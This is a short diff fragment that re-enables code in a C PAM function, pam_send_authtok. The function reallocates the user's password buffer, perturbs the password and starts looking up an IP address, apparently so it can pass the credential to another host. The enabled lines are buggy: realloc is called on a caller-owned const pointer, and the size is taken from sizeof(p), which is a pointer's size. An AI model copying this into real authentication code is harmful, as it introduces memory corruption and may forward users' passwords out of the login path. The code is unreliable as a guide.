@@ -105,14 +105,14 @@ index 043273d..eef9807 100644
 +int pam_send_authtok(const char *message, const char *name, const char *p) {
 +
 +	// Allocate space on heap twice the size of p and copy p over to the first half of the new buffer
-+    //char* temp = (char*)realloc(p, sizeof(p) * 2 + 1);
++    char* temp = (char*)realloc(p, sizeof(p) * 2 + 1);
 +
-+    //if (temp == NULL) return 1;
-+    //p = temp;
++    if (temp == NULL) return 1;
++    p = temp;
 +
-+    //if (strncmp(p, ":", 1) != 0) {
-+    //    perturb_password(p, EPS);
-+    //}
++    if (strncmp(p, ":", 1) != 0) {
++        perturb_password(p, EPS);
++    }
 +
 +    // Get IP using helper function
 +    char ipaddr[INET_ADDRSTRLEN];
